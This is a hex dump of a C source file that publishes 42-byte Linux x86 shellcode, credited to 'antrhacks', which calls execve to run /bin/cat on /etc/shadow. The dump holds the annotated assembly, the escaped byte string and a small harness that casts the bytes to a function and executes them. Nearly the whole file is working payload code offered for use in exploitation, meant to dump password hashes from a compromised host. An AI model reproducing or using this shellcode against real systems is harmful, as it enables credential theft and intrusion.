00000000  2f 2a 20 0d 0a 20 2a 20  54 69 74 6c 65 3a 20 6c  |/* .. * Title: l|
00000010  69 6e 75 78 2f 78 38 36  20 65 78 65 63 76 65 28  |inux/x86 execve(|
00000020  2f 62 69 6e 2f 63 61 74  2c 20 2f 65 74 63 2f 73  |/bin/cat, /etc/s|
00000030  68 61 64 6f 77 2c 20 4e  55 4c 4c 29 20 2d 20 34  |hadow, NULL) - 4|
00000040  32 20 62 79 74 65 73 0d  0a 20 2a 20 54 79 70 65  |2 bytes.. * Type|
00000050  3a 20 53 68 65 6c 6c 63  6f 64 65 0d 0a 20 2a 20  |: Shellcode.. * |
00000060  41 75 74 68 6f 72 3a 20  61 6e 74 72 68 61 63 6b  |Author: antrhack|
00000070  73 0d 0a 20 2a 20 50 6c  61 74 66 6f 72 6d 3a 20  |s.. * Platform: |
00000080  4c 69 6e 75 78 20 58 38  36 0d 0a 2a 2f 0d 0a 0d  |Linux X86..*/...|
00000090  0a 2f 2a 20 41 53 53 65  6d 62 6c 79 0d 0a 20 33  |./* ASSembly.. 3|
000000a0  31 20 63 30 20 20 20 20  20 20 20 20 20 20 20 20  |1 c0            |
000000b0  20 20 20 20 09 78 6f 72  20 20 20 20 25 65 61 78  |    .xor    %eax|
000000c0  2c 25 65 61 78 0d 0a 20  35 30 20 20 20 20 20 20  |,%eax.. 50      |
000000d0  20 20 20 20 20 20 20 20  20 20 20 20 20 09 70 75  |             .pu|
000000e0  73 68 20 20 20 25 65 61  78 0d 0a 20 36 38 20 32  |sh   %eax.. 68 2|
000000f0  66 20 36 33 20 36 31 20  37 34 20 20 20 20 20 20  |f 63 61 74      |
00000100  20 09 70 75 73 68 20 20  20 24 30 78 37 34 36 31  | .push   $0x7461|
00000110  36 33 32 66 0d 0a 20 36  38 20 32 66 20 36 32 20  |632f.. 68 2f 62 |
00000120  36 39 20 36 65 20 20 20  20 20 20 20 09 70 75 73  |69 6e       .pus|
00000130  68 20 20 20 24 30 78 36  65 36 39 36 32 32 66 0d  |h   $0x6e69622f.|
00000140  0a 20 38 39 20 65 33 20  20 20 20 20 20 20 20 20  |. 89 e3         |
00000150  20 20 20 20 20 20 20 09  6d 6f 76 20 20 20 20 25  |       .mov    %|
00000160  65 73 70 2c 25 65 62 78  0d 0a 20 35 30 20 20 20  |esp,%ebx.. 50   |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  09 70 75 73 68 20 20 20  25 65 61 78 0d 0a 20 36  |.push   %eax.. 6|
00000190  38 20 36 31 20 36 34 20  36 66 20 37 37 20 20 20  |8 61 64 6f 77   |
000001a0  20 20 20 20 09 70 75 73  68 20 20 20 24 30 78 37  |    .push   $0x7|
000001b0  37 36 66 36 34 36 31 0d  0a 20 36 38 20 32 66 20  |76f6461.. 68 2f |
000001c0  32 66 20 37 33 20 36 38  20 20 20 20 20 20 20 09  |2f 73 68       .|
000001d0  70 75 73 68 20 20 20 24  30 78 36 38 37 33 32 66  |push   $0x68732f|
000001e0  32 66 0d 0a 20 36 38 20  32 66 20 36 35 20 37 34  |2f.. 68 2f 65 74|
000001f0  20 36 33 20 20 20 20 20  20 20 09 70 75 73 68 20  | 63       .push |
00000200  20 20 24 30 78 36 33 37  34 36 35 32 66 0d 0a 20  |  $0x6374652f.. |
00000210  38 39 20 65 31 20 20 20  20 20 20 20 20 20 20 20  |89 e1           |
00000220  20 20 20 20 20 09 6d 6f  76 20 20 20 20 25 65 73  |     .mov    %es|
00000230  70 2c 25 65 63 78 0d 0a  20 35 30 20 20 20 20 20  |p,%ecx.. 50     |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 70  |              .p|
00000250  75 73 68 20 20 20 25 65  61 78 0d 0a 20 35 31 20  |ush   %eax.. 51 |
00000260  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000270  20 20 09 70 75 73 68 20  20 20 25 65 63 78 0d 0a  |  .push   %ecx..|
00000280  20 35 33 20 20 20 20 20  20 20 20 20 20 20 20 20  | 53             |
00000290  20 20 20 20 20 20 09 70  75 73 68 20 20 20 25 65  |      .push   %e|
000002a0  62 78 0d 0a 20 38 39 20  65 31 20 20 20 20 20 20  |bx.. 89 e1      |
000002b0  20 20 20 20 20 20 20 20  20 20 09 6d 6f 76 20 20  |          .mov  |
000002c0  20 20 25 65 73 70 2c 25  65 63 78 0d 0a 20 62 30  |  %esp,%ecx.. b0|
000002d0  20 30 62 20 20 20 20 20  20 20 20 20 20 20 20 20  | 0b             |
000002e0  20 20 20 09 6d 6f 76 20  20 20 20 24 30 78 62 2c  |   .mov    $0xb,|
000002f0  25 61 6c 0d 0a 20 63 64  20 38 30 0d 0a 2a 2f 0d  |%al.. cd 80..*/.|
00000300  0a 0d 0a 69 6e 74 20 6d  61 69 6e 28 29 7b 0d 0a  |...int main(){..|
00000310  63 68 61 72 20 73 68 65  6c 6c 5b 5d 20 3d 0d 0a  |char shell[] =..|
00000320  22 5c 78 33 31 5c 78 63  30 22 0d 0a 22 5c 78 35  |"\x31\xc0".."\x5|
00000330  30 22 0d 0a 22 5c 78 36  38 5c 78 32 66 5c 78 36  |0".."\x68\x2f\x6|
00000340  33 5c 78 36 31 5c 78 37  34 22 0d 0a 22 5c 78 36  |3\x61\x74".."\x6|
00000350  38 5c 78 32 66 5c 78 36  32 5c 78 36 39 5c 78 36  |8\x2f\x62\x69\x6|
00000360  65 22 0d 0a 22 5c 78 38  39 5c 78 65 33 22 0d 0a  |e".."\x89\xe3"..|
00000370  22 5c 78 35 30 22 0d 0a  22 5c 78 36 38 5c 78 36  |"\x50".."\x68\x6|
00000380  31 5c 78 36 34 5c 78 36  66 5c 78 37 37 22 0d 0a  |1\x64\x6f\x77"..|
00000390  22 5c 78 36 38 5c 78 32  66 5c 78 32 66 5c 78 37  |"\x68\x2f\x2f\x7|
000003a0  33 5c 78 36 38 22 0d 0a  22 5c 78 36 38 5c 78 32  |3\x68".."\x68\x2|
000003b0  66 5c 78 36 35 5c 78 37  34 5c 78 36 33 22 0d 0a  |f\x65\x74\x63"..|
000003c0  22 5c 78 38 39 5c 78 65  31 22 0d 0a 22 5c 78 35  |"\x89\xe1".."\x5|
000003d0  30 22 0d 0a 22 5c 78 35  31 22 0d 0a 22 5c 78 35  |0".."\x51".."\x5|
000003e0  33 22 0d 0a 22 5c 78 38  39 5c 78 65 31 22 0d 0a  |3".."\x89\xe1"..|
000003f0  22 5c 78 62 30 5c 78 30  62 22 0d 0a 22 5c 78 63  |"\xb0\x0b".."\xc|
00000400  64 5c 78 38 30 22 3b 0d  0a 0d 0a 20 70 72 69 6e  |d\x80";.... prin|
00000410  74 66 28 22 5b 2a 5d 20  54 61 69 6c 6c 65 20 64  |tf("[*] Taille d|
00000420  75 20 53 68 65 6c 6c 43  6f 64 65 20 3d 20 25 64  |u ShellCode = %d|
00000430  5c 6e 22 2c 20 73 74 72  6c 65 6e 28 73 68 65 6c  |\n", strlen(shel|
00000440  6c 29 29 3b 0d 0a 20 28  2a 28 76 6f 69 64 20 28  |l));.. (*(void (|
00000450  2a 29 28 29 29 20 73 68  65 6c 6c 29 28 29 3b 0d  |*)()) shell)();.|
00000460  0a 20 0d 0a 20 72 65 74  75 72 6e 20 30 3b 0d 0a  |. .. return 0;..|
00000470  7d                                                |}|
00000471
